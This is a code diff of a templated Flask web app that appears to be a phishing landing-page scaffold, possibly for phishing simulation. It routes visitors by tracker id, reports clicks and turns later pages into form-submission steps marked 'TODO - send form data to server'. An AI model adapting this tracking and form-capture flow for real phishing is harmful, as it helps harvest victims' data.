@@ -13,11 +13,11 @@ rdirect_url = '$redirect_url'
 
 @app.route('/<path:tracker>')
 @app.route('/')
-def index(tracker=''):
-    if tracker == '':
-        return redirect(url_for('url1'))
+def index(tracker=None):
+    if tracker:
+        return redirect(url_for('url1', id=tracker))
     else:
-        return redirect('%s?id=%s' % (url_for('url1'), tracker))
+        return redirect(url_for('url1'))
 
 
 @app.route(url_1, methods=['GET', 'POST'])
@@ -27,26 +27,28 @@ def url1():
         report_action(id, 'Clicked')
         
     return render_template(
-        '1.html'
+        '1.html',
+        next_url = url_for('url2', id=id)
     )
 
 
-@app.route(url_2, methods=['GET', 'POST'])
+@app.route(url_2, methods=['POST'])
 def url2():
     id = request.args.get('id')
-    if id is not None:
-        # pass to server to log user click
+    if request.form:
         pass
+       # TODO - send form data to server
     return render_template(
-        '2.html'
+        '2.html',
+        next_url = url_for('url3', id=id)
     )
 
-@app.route(url_3, methods=['GET', 'POST'])
+@app.route(url_3, methods=['POST'])
 def url3():
     id = request.args.get('id')
-    if id is not None:
-        # pass to server to log user click
+    if request.form:
         pass
+       # TODO - send form data to server
     return render_template(
         '3.html'
     )
@@ -55,9 +57,9 @@ def url3():
 @app.route(url_4, methods=['GET', 'POST'])
 def url4():
     id = request.args.get('id')
-    if id is not None:
-        # pass to server to log user click
+    if request.form:
         pass
+       # TODO - send form data to server
     return render_template(
         '4.html'
     )
@@ -66,9 +68,9 @@ def url4():
 @app.route(url_5, methods=['GET', 'POST'])
 def url5():
     id = request.args.get('id')
-    if id is not None:
-        # pass to server to log user click
+    if request.form:
         pass
+       # TODO - send form data to server
     return render_template(
         '5.html'
     )
